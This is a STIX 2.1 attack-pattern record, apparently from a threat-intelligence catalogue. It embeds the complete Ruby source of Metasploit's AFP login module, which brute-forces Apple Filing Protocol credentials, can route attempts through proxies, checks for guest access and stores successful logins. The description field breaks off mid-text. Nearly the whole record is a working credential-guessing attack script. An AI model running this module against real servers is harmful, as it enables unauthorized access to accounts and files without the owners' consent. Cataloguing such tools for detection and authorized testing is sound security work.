{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cb5b03ea-9394-4569-966b-c71bef1c71b0",
    "created": "2024-08-14T16:27:50.677602Z",
    "modified": "2024-08-14T16:27:50.677606Z",
    "name": "Apple Filing Protocol Login Utility",
    "description": " This module attempts to bruteforce authentication credentials for AFP.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/afp/afp_login.rb",
            "external_id": "afp_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://developer.apple.com/library/mac/documentation/networking/conceptual/afp/AFPSecurity/AFPSecurity.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/afp'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Exploit::Remote::AFP\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'         => 'Apple Filing Protocol Login Utility',\n      'Description'  => %q{\n        This module attempts to bruteforce authentication credentials for AFP.\n      },\n      'References'     =>\n        [\n          [ 'URL', 'https://web.archive.org/web/20130309051753/https://developer.apple.com/library/mac/#documentation/Networking/Reference/AFP_Reference/Reference/reference.html' ],\n          [ 'URL', 'https://developer.apple.com/library/mac/documentation/networking/conceptual/afp/AFPSecurity/AFPSecurity.html' ]\n\n        ],\n      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],\n      'License'      => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::Proxies,\n        OptInt.new('LoginTimeOut', [ true, \"Timout on login\", 23 ]),\n        OptBool.new('RECORD_GUEST', [ false, \"Record guest login to the database\", false]),\n        OptBool.new('CHECK_GUEST', [ false, \"Check for guest login\", true])\n      ], self)\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def run_host(ip)\n    print_status(\"Scanning IP: #{ip.to_s}\")\n\n    cred_collection = build_credential_collection(\n        username: datastore['USERNAME'],\n        password: datastore['PASSWORD'],\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::AFP.new(\n        host: ip,\n        port: rport,\n        proxies: datastore['PROXIES'],\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 30,\n        max_send_size: datastore['TCP::max_send_size'],\n        send_delay: datastore['TCP::send_delay'],\n        framework: framework,\n        framework_module: self,\n        ssl: datastore['SSL'],\n        ssl_version: datastore['SSLVersion'],\n        ssl_verify_mode: datastore['SSLVerifyMode'],\n        ssl_cipher: datastore['SSLCipher'],\n        local_port: datastore['CPORT'],\n        local_host: datastore['CHOST']\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"\n      end\n    end\n  end\n\n\nend\n",
    "x_mitre_contributors": [
        "[ Gregory Man <man.gregory[at]gmail.com> ]",
        ""
    ]
}